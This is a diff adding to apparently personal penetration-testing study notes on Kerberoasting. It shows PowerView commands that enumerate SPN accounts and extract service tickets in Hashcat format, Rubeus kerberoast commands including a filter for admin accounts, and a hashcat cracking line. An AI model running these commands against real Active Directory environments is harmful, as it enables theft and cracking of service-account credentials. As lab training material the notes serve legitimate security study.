@@ -107,3 +107,29 @@ hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt
 ## Automated / Tool Based Route
 #### Using PowerView to Enumerate SPN Accounts
 
+```powershell
+Get-DomainUser * -spn | select samaccountname
+```
+#### Using PowerView to Target a Specific User
+
+```powershell
+Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
+```
+#### Exporting All Tickets to a CSV File
+
+```powershell
+Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
+```
+
+We can also use `Rubeus` to perform Kerbroasting even faster
+#### Using the /stats Flag
+
+```powershell
+.\Rubeus.exe kerbroast /stats
+```
+#### Using the /nowrap Flag
+
+```powershell
+.\Rubeus.exe kerbroast /ldapfilter:'admincount=1' /nowrap
+```
+
